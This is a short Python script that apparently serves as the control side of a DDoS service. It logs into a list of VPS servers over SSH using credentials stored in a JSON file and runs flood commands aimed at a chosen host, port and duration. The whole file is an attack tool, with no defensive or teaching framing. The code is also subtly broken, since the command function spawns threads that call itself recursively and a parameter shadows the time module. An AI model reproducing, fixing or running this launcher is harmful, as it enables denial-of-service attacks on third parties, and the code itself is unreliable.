import paramiko, json, time, threading
from parse_attack import parse_command

def execute_command_on_vps(command):
    with open('./data/vps_servers.json') as file:
        data = json.load(file)  
    for vps in data:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(vps['address'], username=vps['username'], password=vps['password'])
            stdin, stdout, stderr = ssh.exec_command(command)
            print(f"[ {vps['address']} ] --> {stdout.read().decode('utf-8')}")
        except paramiko.AuthenticationException as e:
            print(f"Failed to connect to {vps['address']}: {e}")
        finally:
            ssh.close()
            time.sleep(1)
            
    threads = []
    for server in data:
        thread = threading.Thread(target=execute_command_on_vps, args=(server,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def launch_attacks(method, host, port, time):
    cmd = parse_command(method, host, port, time)
    execute_command_on_vps(cmd)